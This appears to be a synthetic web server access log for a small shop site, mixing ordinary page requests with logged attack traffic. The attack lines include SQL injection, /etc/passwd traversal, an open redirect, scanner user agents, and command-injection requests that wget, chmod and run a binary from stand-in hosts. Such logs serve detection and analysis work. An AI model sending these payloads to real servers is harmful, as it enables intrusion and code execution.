192.168.1.10 - - [21/May/2026:20:16:57 +0000] "GET /products/12 HTTP/1.1" 200 8993 "https://example.com/" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0.0.0 Safari/537.36"
192.168.1.13 - - [21/May/2026:16:31:25 +0000] "GET /static/js/app.js HTTP/1.1" 200 4056 "https://www.google.com/" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.4 Safari/605.1.15"
192.168.1.10 - - [21/May/2026:11:53:30 +0000] "GET /about HTTP/1.1" 200 5989 "https://mail.example.com/" "Mozilla/5.0 (X11; Linux x86_64; rv:124.0) Gecko/20100101 Firefox/124.0"
10.0.0.21 - - [21/May/2026:18:17:39 +0000] "GET /api/v1/user/profile HTTP/1.1" 200 1531 "https://yandex.ru/" "Mozilla/5.0 (X11; Linux x86_64; rv:124.0) Gecko/20100101 Firefox/124.0"
45.155.205.33 - - [21/May/2026:12:16:02 +0000] "POST /api/v1/user?id=1%27%2bOR%2b%271%27%3d%271 HTTP/1.1" 403 674 "-" "Nmap Scripting Engine; https://nmap.org/book/nse.html"
203.0.113.11 - - [21/May/2026:12:18:43 +0000] "GET / HTTP/1.1" 200 3222 "https://example.com/" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.4 Safari/605.1.15"
10.0.0.23 - - [21/May/2026:15:47:16 +0000] "GET /search?q=phone HTTP/1.1" 200 7029 "https://mail.example.com/" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.4 Safari/605.1.15"
192.168.1.13 - - [21/May/2026:18:21:58 +0000] "GET /static/js/app.js HTTP/1.1" 200 2886 "https://www.google.com/" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.4 Safari/605.1.15"
10.0.0.23 - - [21/May/2026:09:24:26 +0000] "GET /index.html HTTP/1.1" 200 3648 "https://www.google.com/" "Mozilla/5.0 (iPhone; CPU iPhone OS 17_4 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.4 Mobile/15E148 Safari/604.1"
10.0.0.22 - - [21/May/2026:10:17:29 +0000] "GET /about HTTP/1.1" 200 5575 "https://yandex.ru/" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0.0.0 Safari/537.36"
203.0.113.10 - - [21/May/2026:17:34:05 +0000] "GET /api/v1/products?page=2 HTTP/1.1" 200 3422 "https://yandex.ru/" "Mozilla/5.0 (X11; Linux x86_64; rv:124.0) Gecko/20100101 Firefox/124.0"
10.0.0.24 - - [21/May/2026:12:20:11 +0000] "GET /about HTTP/1.1" 200 4035 "https://example.com/" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0.0.0 Safari/537.36"
203.0.113.11 - - [21/May/2026:14:19:42 +0000] "GET /api/v1/user/profile HTTP/1.1" 200 5629 "-" "Mozilla/5.0 (X11; Linux x86_64; rv:124.0) Gecko/20100101 Firefox/124.0"
10.0.0.22 - - [21/May/2026:17:14:47 +0000] "GET /search?q=laptop HTTP/1.1" 200 4949 "https://yandex.ru/" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0.0.0 Safari/537.36"
10.0.0.22 - - [21/May/2026:18:22:30 +0000] "GET / HTTP/1.1" 200 3653 "-" "Mozilla/5.0 (iPhone; CPU iPhone OS 17_4 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.4 Mobile/15E148 Safari/604.1"
185.220.101.45 - - [21/May/2026:11:43:15 +0000] "GET /wp-content/plugins/ HTTP/1.1" 403 276 "-" "sqlmap/1.8.3#stable (https://sqlmap.org)"
192.168.1.11 - - [21/May/2026:11:39:10 +0000] "GET /checkout HTTP/1.1" 200 3083 "https://yandex.ru/" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.4 Safari/605.1.15"
10.0.0.24 - - [21/May/2026:12:04:21 +0000] "GET /api/v1/products?page=1 HTTP/1.1" 200 2135 "-" "Mozilla/5.0 (iPhone; CPU iPhone OS 17_4 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.4 Mobile/15E148 Safari/604.1"
192.168.1.10 - - [21/May/2026:15:24:54 +0000] "GET /products/43 HTTP/1.1" 200 3774 "-" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.4 Safari/605.1.15"
10.0.0.23 - - [21/May/2026:18:26:16 +0000] "GET /api/v1/products?page=1 HTTP/1.1" 200 2174 "https://mail.example.com/" "Mozilla/5.0 (X11; Linux x86_64; rv:124.0) Gecko/20100101 Firefox/124.0"
192.168.1.12 - - [21/May/2026:11:45:35 +0000] "GET /api/v1/status HTTP/1.1" 200 8967 "https://yandex.ru/" "Mozilla/5.0 (X11; Linux x86_64; rv:124.0) Gecko/20100101 Firefox/124.0"
203.0.113.10 - - [21/May/2026:20:10:01 +0000] "GET /static/img/logo.png HTTP/1.1" 200 4509 "https://yandex.ru/" "Mozilla/5.0 (X11; Linux x86_64; rv:124.0) Gecko/20100101 Firefox/124.0"
203.0.113.11 - - [21/May/2026:20:20:09 +0000] "GET / HTTP/1.1" 200 1189 "-" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.4 Safari/605.1.15"
45.155.205.33 - - [21/May/2026:13:41:19 +0000] "GET /search?q=%22%20OR%20%221%22%3D%221 HTTP/1.1" 403 1133 "-" "sqlmap/1.8.3#stable (https://sqlmap.org)"
172.16.0.45 - - [21/May/2026:13:07:11 +0000] "GET /shell?cd+/tmp;wget+http://malicious.example/bin;chmod+777+bin;./bin HTTP/1.1" 500 495 "-" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.4 Safari/605.1.15"
10.0.0.24 - - [21/May/2026:16:13:37 +0000] "GET /static/js/app.js HTTP/1.1" 200 3747 "https://example.com/" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.4 Safari/605.1.15"
10.0.0.22 - - [21/May/2026:10:53:52 +0000] "GET /contact HTTP/1.1" 200 3139 "https://example.com/" "Mozilla/5.0 (iPhone; CPU iPhone OS 17_4 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.4 Mobile/15E148 Safari/604.1"
203.0.113.12 - - [21/May/2026:15:20:57 +0000] "GET /search?q=laptop HTTP/1.1" 200 1537 "https://example.com/" "Mozilla/5.0 (iPhone; CPU iPhone OS 17_4 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.4 Mobile/15E148 Safari/604.1"
10.0.0.24 - - [21/May/2026:19:52:27 +0000] "GET /products/12 HTTP/1.1" 404 404 "https://mail.example.com/" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0.0.0 Safari/537.36"
172.16.0.46 - - [21/May/2026:14:39:55 +0000] "GET /shell?cmd=%77%67%65%74%20http%3A%2F%2Fevil.example%2Fx%20-O%20%2Ftmp%2Fx HTTP/1.1" 403 1139 "-" "Mozilla/5.0 (X11; Linux x86_64; rv:124.0) Gecko/20100101 Firefox/124.0"
10.0.0.21 - - [21/May/2026:12:43:15 +0000] "GET / HTTP/1.1" 200 4626 "https://mail.example.com/" "Mozilla/5.0 (X11; Linux x86_64; rv:124.0) Gecko/20100101 Firefox/124.0"
192.168.1.10 - - [21/May/2026:19:48:42 +0000] "GET /static/css/style.css HTTP/1.1" 200 5951 "https://example.com/" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.4 Safari/605.1.15"
10.0.0.21 - - [21/May/2026:08:32:08 +0000] "GET /checkout HTTP/1.1" 200 1078 "https://mail.example.com/" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.4 Safari/605.1.15"
203.0.113.12 - - [21/May/2026:10:18:54 +0000] "GET /static/css/style.css HTTP/1.1" 200 1338 "https://example.com/" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.4 Safari/605.1.15"
203.0.113.10 - - [21/May/2026:08:02:10 +0000] "GET /search?q=laptop HTTP/1.1" 200 8820 "-" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.4 Safari/605.1.15"
10.0.0.21 - - [21/May/2026:19:11:33 +0000] "GET /search?q=laptop HTTP/1.1" 200 1161 "-" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.4 Safari/605.1.15"
192.168.1.12 - - [21/May/2026:15:45:29 +0000] "GET /checkout HTTP/1.1" 200 4996 "https://mail.example.com/" "Mozilla/5.0 (iPhone; CPU iPhone OS 17_4 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.4 Mobile/15E148 Safari/604.1"
91.240.118.172 - - [21/May/2026:20:11:09 +0000] "GET /db.sql HTTP/1.1" 404 1049 "-" "gobuster/3.6"
192.168.1.13 - - [21/May/2026:13:08:19 +0000] "GET /api/v1/status HTTP/1.1" 200 6613 "https://example.com/" "Mozilla/5.0 (X11; Linux x86_64; rv:124.0) Gecko/20100101 Firefox/124.0"
10.0.0.23 - - [21/May/2026:09:15:49 +0000] "GET /about HTTP/1.1" 200 3585 "https://example.com/" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0.0.0 Safari/537.36"
10.0.0.23 - - [21/May/2026:15:55:02 +0000] "GET /static/img/logo.png HTTP/1.1" 200 1454 "https://www.google.com/" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0.0.0 Safari/537.36"
10.0.0.21 - - [21/May/2026:12:48:22 +0000] "GET /api/v1/products?page=1 HTTP/1.1" 200 3739 "https://example.com/" "Mozilla/5.0 (X11; Linux x86_64; rv:124.0) Gecko/20100101 Firefox/124.0"
192.168.1.11 - - [21/May/2026:13:05:44 +0000] "GET /api/v1/products?page=1 HTTP/1.1" 200 7781 "https://yandex.ru/" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0.0.0 Safari/537.36"
10.0.0.23 - - [21/May/2026:13:15:56 +0000] "GET /products/43 HTTP/1.1" 200 1041 "https://yandex.ru/" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.4 Safari/605.1.15"
172.16.0.46 - - [21/May/2026:14:49:03 +0000] "GET /index.php?page=..%2F..%2F..%2Fetc%2Fpasswd HTTP/1.1" 403 422 "-" "Mozilla/5.0 (X11; Linux x86_64; rv:124.0) Gecko/20100101 Firefox/124.0"
192.168.1.11 - - [21/May/2026:12:44:03 +0000] "GET /static/css/style.css HTTP/1.1" 200 4517 "https://yandex.ru/" "Mozilla/5.0 (X11; Linux x86_64; rv:124.0) Gecko/20100101 Firefox/124.0"
203.0.113.12 - - [21/May/2026:11:56:51 +0000] "GET /contact HTTP/1.1" 200 7988 "https://example.com/" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0.0.0 Safari/537.36"
198.51.100.78 - - [21/May/2026:15:09:15 +0000] "POST /redirect?url=http%3A%2F%2Fevil.example%2Fphish HTTP/1.1" 404 500 "-" "Mozilla/5.0 (X11; Linux x86_64; rv:124.0) Gecko/20100101 Firefox/124.0"
45.155.205.33 - - [21/May/2026:19:25:18 +0000] "GET /product?id=1/**/UNION/**/SELECT/**/user,password/**/FROM/**/users HTTP/1.1" 200 7351 "-" "sqlmap/1.8.3#stable (https://sqlmap.org)"
203.0.113.12 - - [21/May/2026:14:54:41 +0000] "GET /index.html HTTP/1.1" 200 4783 "-" "Mozilla/5.0 (iPhone; CPU iPhone OS 17_4 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.4 Mobile/15E148 Safari/604.1"
10.0.0.24 - - [21/May/2026:12:36:59 +0000] "GET /static/img/logo.png HTTP/1.1" 200 1526 "-" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.4 Safari/605.1.15"
192.168.1.12 - - [21/May/2026:16:45:46 +0000] "GET /api/v1/status HTTP/1.1" 200 3611 "https://example.com/" "Mozilla/5.0 (X11; Linux x86_64; rv:124.0) Gecko/20100101 Firefox/124.0"
203.0.113.11 - - [21/May/2026:14:11:04 +0000] "GET /api/v1/products?page=2 HTTP/1.1" 200 7488 "https://mail.example.com/" "Mozilla/5.0 (X11; Linux x86_64; rv:124.0) Gecko/20100101 Firefox/124.0"
192.168.1.11 - - [21/May/2026:20:21:51 +0000] "GET /about HTTP/1.1" 200 5458 "https://example.com/" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0.0.0 Safari/537.36"
91.240.118.172 - - [21/May/2026:16:57:20 +0000] "GET /shell?cmd=%77%67%65%74%20http%3A%2F%2Fevil.example%2Fx%20-O%20%2Ftmp%2Fx HTTP/1.1" 403 1182 "-" "Nmap Scripting Engine; https://nmap.org/book/nse.html"
192.168.1.11 - - [21/May/2026:13:25:25 +0000] "GET /contact HTTP/1.1" 200 7735 "https://yandex.ru/" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.4 Safari/605.1.15"
203.0.113.11 - - [21/May/2026:13:40:44 +0000] "GET /api/v1/user/profile HTTP/1.1" 200 4101 "https://example.com/" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.4 Safari/605.1.15"
10.0.0.24 - - [21/May/2026:08:50:05 +0000] "GET /search?q=laptop HTTP/1.1" 200 5863 "https://www.google.com/" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0.0.0 Safari/537.36"
198.51.100.79 - - [21/May/2026:08:21:37 +0000] "POST /wp-content/themes/ HTTP/1.1" 404 614 "-" "Mozilla/5.0 (X11; Linux x86_64; rv:124.0) Gecko/20100101 Firefox/124.0"
192.168.1.13 - - [21/May/2026:15:12:50 +0000] "POST /checkout HTTP/1.1" 200 8934 "https://mail.example.com/" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.4 Safari/605.1.15"
172.16.0.45 - - [21/May/2026:10:03:40 +0000] "GET /index.php?page=..%2F..%2F..%2Fetc%2Fpasswd HTTP/1.1" 500 248 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0.0.0 Safari/537.36"
192.168.1.10 - - [21/May/2026:10:54:40 +0000] "GET /products HTTP/1.1" 200 6328 "-" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.4 Safari/605.1.15"
10.0.0.23 - - [21/May/2026:12:17:51 +0000] "GET /static/img/logo.png HTTP/1.1" 200 6030 "https://example.com/" "Mozilla/5.0 (X11; Linux x86_64; rv:124.0) Gecko/20100101 Firefox/124.0"
198.51.100.79 - - [21/May/2026:12:55:03 +0000] "GET /wp-content/plugins/ HTTP/1.1" 404 78 "https://www.google.com/" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0.0.0 Safari/537.36"
192.168.1.10 - - [21/May/2026:11:45:46 +0000] "GET /cart HTTP/1.1" 200 6015 "https://www.google.com/" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.4 Safari/605.1.15"
192.168.1.13 - - [21/May/2026:19:11:17 +0000] "GET /products HTTP/1.1" 200 8975 "https://www.google.com/" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.4 Safari/605.1.15"
198.51.100.77 - - [21/May/2026:15:11:53 +0000] "POST /search?q=test%22%20AND%20%28SELECT%201%20FROM%20%28SELECT%28SLEEP%285%29%29%29a%29-- HTTP/1.1" 404 433 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0.0.0 Safari/537.36"
10.0.0.24 - - [21/May/2026:15:22:47 +0000] "POST /checkout HTTP/1.1" 200 2417 "https://mail.example.com/" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.4 Safari/605.1.15"
203.0.113.12 - - [21/May/2026:19:54:38 +0000] "GET /about HTTP/1.1" 200 729 "https://example.com/" "Mozilla/5.0 (iPhone; CPU iPhone OS 17_4 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.4 Mobile/15E148 Safari/604.1"
192.168.1.13 - - [21/May/2026:08:09:07 +0000] "GET /search?q=laptop HTTP/1.1" 200 3450 "https://www.google.com/" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.4 Safari/605.1.15"
10.0.0.24 - - [21/May/2026:15:20:10 +0000] "GET /products/12 HTTP/1.1" 200 8938 "-" "Mozilla/5.0 (X11; Linux x86_64; rv:124.0) Gecko/20100101 Firefox/124.0"
198.51.100.78 - - [21/May/2026:08:08:18 +0000] "GET /wp-content/plugins/ HTTP/1.1" 404 1080 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0.0.0 Safari/537.36"
192.168.1.10 - - [21/May/2026:20:02:02 +0000] "GET /index.html HTTP/1.1" 200 8764 "https://example.com/" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0.0.0 Safari/537.36"
10.0.0.23 - - [21/May/2026:17:42:47 +0000] "GET /api/v1/status HTTP/1.1" 200 6015 "https://example.com/" "Mozilla/5.0 (iPhone; CPU iPhone OS 17_4 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.4 Mobile/15E148 Safari/604.1"
192.168.1.10 - - [21/May/2026:13:40:21 +0000] "GET /about HTTP/1.1" 200 6179 "https://example.com/" "Mozilla/5.0 (iPhone; CPU iPhone OS 17_4 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.4 Mobile/15E148 Safari/604.1"
10.0.0.24 - - [21/May/2026:15:16:38 +0000] "GET /api/v1/products?page=1 HTTP/1.1" 200 989 "https://example.com/" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0.0.0 Safari/537.36"
192.168.1.10 - - [21/May/2026:19:50:55 +0000] "GET /api/v1/status HTTP/1.1" 200 810 "https://yandex.ru/" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0.0.0 Safari/537.36"
192.168.1.10 - - [21/May/2026:17:57:09 +0000] "GET /products/43 HTTP/1.1" 200 8815 "-" "Mozilla/5.0 (iPhone; CPU iPhone OS 17_4 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.4 Mobile/15E148 Safari/604.1"
45.155.205.33 - - [21/May/2026:17:44:10 +0000] "POST /api/v1/login HTTP/1.1" 403 576 "-" "sqlmap/1.8.3#stable (https://sqlmap.org)"
203.0.113.12 - - [21/May/2026:09:57:18 +0000] "GET /cart HTTP/1.1" 200 3755 "https://yandex.ru/" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.4 Safari/605.1.15"
192.168.1.11 - - [21/May/2026:09:44:46 +0000] "GET /api/v1/user/profile HTTP/1.1" 200 4941 "https://mail.example.com/" "Mozilla/5.0 (X11; Linux x86_64; rv:124.0) Gecko/20100101 Firefox/124.0"
203.0.113.12 - - [21/May/2026:17:08:23 +0000] "GET /static/img/logo.png HTTP/1.1" 200 3559 "https://www.google.com/" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.4 Safari/605.1.15"
203.0.113.12 - - [21/May/2026:18:02:03 +0000] "GET /contact HTTP/1.1" 200 6053 "-" "Mozilla/5.0 (iPhone; CPU iPhone OS 17_4 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.4 Mobile/15E148 Safari/604.1"
198.51.100.79 - - [21/May/2026:11:40:52 +0000] "POST /admin/login HTTP/1.1" 404 317 "https://www.google.com/" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0.0.0 Safari/537.36"
10.0.0.24 - - [21/May/2026:13:26:12 +0000] "GET /api/v1/products?page=1 HTTP/1.1" 302 470 "https://example.com/" "Mozilla/5.0 (X11; Linux x86_64; rv:124.0) Gecko/20100101 Firefox/124.0"
192.168.1.11 - - [21/May/2026:18:15:13 +0000] "GET /index.html HTTP/1.1" 200 6675 "https://yandex.ru/" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0.0.0 Safari/537.36"
91.240.118.172 - - [21/May/2026:13:54:26 +0000] "GET /login HTTP/1.1" 404 617 "-" "gobuster/3.6"
172.16.0.46 - - [21/May/2026:12:15:53 +0000] "GET /search?q=test%22%20AND%20%28SELECT%201%20FROM%20%28SELECT%28SLEEP%285%29%29%29a%29-- HTTP/1.1" 403 1031 "-" "Mozilla/5.0 (X11; Linux x86_64; rv:124.0) Gecko/20100101 Firefox/124.0"
203.0.113.11 - - [21/May/2026:14:26:36 +0000] "GET /products/12 HTTP/1.1" 200 1398 "https://example.com/" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.4 Safari/605.1.15"
203.0.113.10 - - [21/May/2026:13:27:13 +0000] "GET /products HTTP/1.1" 200 3781 "https://yandex.ru/" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.4 Safari/605.1.15"
10.0.0.23 - - [21/May/2026:13:09:29 +0000] "GET /static/js/app.js HTTP/1.1" 200 7696 "https://mail.example.com/" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0.0.0 Safari/537.36"
10.0.0.23 - - [21/May/2026:10:40:43 +0000] "GET /checkout HTTP/1.1" 200 7463 "-" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.4 Safari/605.1.15"
10.0.0.24 - - [21/May/2026:17:51:31 +0000] "GET /checkout HTTP/1.1" 200 8688 "https://mail.example.com/" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.4 Safari/605.1.15"
172.16.0.46 - - [21/May/2026:17:59:56 +0000] "GET /product?id=1/**/UNION/**/SELECT/**/user,password/**/FROM/**/users HTTP/1.1" 403 323 "-" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.4 Safari/605.1.15"
203.0.113.10 - - [21/May/2026:18:54:55 +0000] "GET /api/v1/user/profile HTTP/1.1" 200 7088 "-" "Mozilla/5.0 (X11; Linux x86_64; rv:124.0) Gecko/20100101 Firefox/124.0"
10.0.0.23 - - [21/May/2026:12:19:55 +0000] "GET /contact HTTP/1.1" 200 2697 "-" "Mozilla/5.0 (X11; Linux x86_64; rv:124.0) Gecko/20100101 Firefox/124.0"
10.0.0.22 - - [21/May/2026:08:19:09 +0000] "GET /about HTTP/1.1" 200 2338 "-" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.4 Safari/605.1.15"
203.0.113.11 - - [21/May/2026:08:02:14 +0000] "GET /search?q=laptop HTTP/1.1" 200 4772 "https://www.google.com/" "Mozilla/5.0 (X11; Linux x86_64; rv:124.0) Gecko/20100101 Firefox/124.0"
203.0.113.12 - - [21/May/2026:16:37:10 +0000] "GET /static/img/logo.png HTTP/1.1" 200 915 "https://www.google.com/" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0.0.0 Safari/537.36"
203.0.113.12 - - [21/May/2026:15:22:20 +0000] "GET /cart HTTP/1.1" 200 1781 "https://www.google.com/" "Mozilla/5.0 (iPhone; CPU iPhone OS 17_4 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.4 Mobile/15E148 Safari/604.1"
192.168.1.13 - - [21/May/2026:08:26:32 +0000] "GET /api/v1/products?page=2 HTTP/1.1" 200 1663 "https://mail.example.com/" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0.0.0 Safari/537.36"
10.0.0.21 - - [21/May/2026:08:56:30 +0000] "GET /products/12 HTTP/1.1" 200 3284 "https://mail.example.com/" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.4 Safari/605.1.15"
192.168.1.10 - - [21/May/2026:09:49:50 +0000] "GET /static/js/app.js HTTP/1.1" 200 5215 "https://mail.example.com/" "Mozilla/5.0 (iPhone; CPU iPhone OS 17_4 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.4 Mobile/15E148 Safari/604.1"
192.168.1.11 - - [21/May/2026:16:16:37 +0000] "GET /api/v1/products?page=1 HTTP/1.1" 200 3094 "https://yandex.ru/" "Mozilla/5.0 (X11; Linux x86_64; rv:124.0) Gecko/20100101 Firefox/124.0"
185.220.101.45 - - [21/May/2026:11:09:31 +0000] "GET /index.php?page=..%2F..%2F..%2Fetc%2Fpasswd HTTP/1.1" 404 495 "-" "gobuster/3.6"
192.168.1.11 - - [21/May/2026:14:00:02 +0000] "GET /api/v1/products?page=1 HTTP/1.1" 200 8441 "https://www.google.com/" "Mozilla/5.0 (iPhone; CPU iPhone OS 17_4 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.4 Mobile/15E148 Safari/604.1"
192.168.1.12 - - [21/May/2026:08:42:01 +0000] "GET / HTTP/1.1" 200 6346 "https://yandex.ru/" "Mozilla/5.0 (iPhone; CPU iPhone OS 17_4 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.4 Mobile/15E148 Safari/604.1"
10.0.0.21 - - [21/May/2026:09:31:55 +0000] "GET /static/js/app.js HTTP/1.1" 200 6775 "https://example.com/" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.4 Safari/605.1.15"
203.0.113.12 - - [21/May/2026:17:19:57 +0000] "GET /products HTTP/1.1" 200 4938 "-" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.4 Safari/605.1.15"
45.155.205.33 - - [21/May/2026:13:11:03 +0000] "GET /login HTTP/1.1" 403 172 "-" "Nikto/2.5.0"
203.0.113.11 - - [21/May/2026:16:27:43 +0000] "GET /search?q=laptop HTTP/1.1" 200 8737 "https://yandex.ru/" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0.0.0 Safari/537.36"
203.0.113.10 - - [21/May/2026:18:43:54 +0000] "GET /contact HTTP/1.1" 200 2806 "https://www.google.com/" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0.0.0 Safari/537.36"
203.0.113.12 - - [21/May/2026:16:43:19 +0000] "GET /about HTTP/1.1" 200 7115 "https://mail.example.com/" "Mozilla/5.0 (iPhone; CPU iPhone OS 17_4 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.4 Mobile/15E148 Safari/604.1"
45.155.205.33 - - [21/May/2026:16:40:59 +0000] "POST /admin HTTP/1.1" 403 1097 "-" "WPScan v3.8.25"
192.168.1.11 - - [21/May/2026:18:01:52 +0000] "GET /cart HTTP/1.1" 200 714 "https://example.com/" "Mozilla/5.0 (X11; Linux x86_64; rv:124.0) Gecko/20100101 Firefox/124.0"
